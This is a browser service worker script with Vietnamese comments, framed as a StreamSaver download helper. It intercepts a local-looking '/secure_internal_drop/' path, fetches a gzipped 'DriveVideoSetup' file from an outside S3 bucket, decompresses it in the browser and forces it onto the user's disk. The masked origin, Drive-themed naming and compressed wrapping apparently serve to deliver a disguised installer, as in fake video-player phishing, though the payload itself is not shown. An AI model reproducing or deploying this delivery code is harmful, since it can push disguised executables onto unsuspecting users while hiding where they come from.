self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
    const url = event.request.url;

    // 1. Giữ nguyên bộ Ping kiểm tra của StreamSaver
    if (url.includes('/drive_secure_download_ping')) {
        event.respondWith(new Response('pong', { status: 200 }));
        return;
    }

    // 2. Đánh chặn đường dẫn nội bộ và stream trực tiếp từ S3
    if (url.includes('/secure_internal_drop/')) {
        
        const directS3Url = 'https://xmetavn.s3.us-east-1.amazonaws.com/DriveVideoSetup.gz';

        event.respondWith(
            fetch(directS3Url, { 
                mode: 'cors', 
                cache: 'no-store' 
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`S3 Download Failed: ${response.status} ${response.statusText}`);
                }

                // [CẢI TIẾN] Tự động lấy tên file từ URL S3
                let filename = directS3Url.split('/').pop().split('?')[0];
                filename = decodeURIComponent(filename);

                // Nếu tên file có đuôi .gz, ta loại bỏ đuôi .gz để trả lại tên file gốc bên trong
                if (filename.toLowerCase().endsWith('.gz')) {
                    filename = filename.substring(0, filename.length - 3);
                }

                // Khởi tạo DecompressionStream để giải nén các chunk dữ liệu ngay khi chúng đổ về
                const ds = new DecompressionStream('gzip');
                const decompressedStream = response.body.pipeThrough(ds);

                // Cấu hình Header đúng chuẩn StreamSaver để kích hoạt trình tải xuống của Browser
                const headers = new Headers({
                    'Content-Type': 'application/octet-stream; charset=utf-8',
                    'Content-Disposition': `attachment; filename="${filename}"`,
                    // StreamSaver cần Content-Length nếu muốn hiện % tiến trình, 
                    // Tuy nhiên khi giải nén Gzip, kích thước thật sẽ thay đổi nên ta để Browser tự tính toán dựa trên Stream kết thúc.
                });

                // Trả về Stream đã giải nén - Browser sẽ ghi trực tiếp vào đĩa cứng của user
                return new Response(decompressedStream, { headers });
            })
            .catch(err => {
                console.error("[StreamSaver SW Error]:", err);
                return new Response(`Stream Download Error: ${err.message}`, { 
                    status: 500,
                    headers: { 'Content-Type': 'text/plain; charset=utf-8' }
                });
            })
        );
        return;
    }
});